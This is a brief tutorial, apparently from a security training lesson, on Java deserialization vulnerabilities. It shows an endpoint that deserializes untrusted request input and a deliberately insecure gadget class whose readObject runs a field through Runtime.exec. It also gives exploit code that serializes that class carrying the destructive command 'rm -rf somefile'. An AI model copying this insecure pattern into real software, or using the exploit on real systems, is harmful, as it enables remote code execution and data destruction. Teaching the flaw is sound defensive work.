## The Simplest Exploit

### Vulnerable code

The following is a well-known example for a Java Deserialization vulnerability.

```java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

It is expecting an `AcmeObject` object, but it will execute `readObject()` before the casting ocurs. If an attacker finds the proper class implementing dangerous operations in `readObject()`, he could serialize that object and force the vulnerable application to performe those actions.

### Class included in ClassPath

Attackers need to find a class in the classpath that supports serialization and with dangerous implementations on `readObject()`.

```java
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

        private static final long serialVersionUID = 1;

        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;

        public VulnerableTaskHolder(String taskName, String taskAction) {
                super();
                this.taskName = taskName;
                this.taskAction = taskAction;
                this.requestedExecutionTime = LocalDateTime.now();
        }

        private void readObject( ObjectInputStream stream ) throws Exception {
        //deserialize data so taskName and taskAction are available
                stream.defaultReadObject();

                //blindly run some code. #code injection
                Runtime.getRuntime().exec(taskAction);
     }
}
```

### Exploit

If the java class shown above exists, attackers can serialize that object and obtain Remote Code Execution.

```java
VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();
byte[] exploit = bos.toByteArray();
```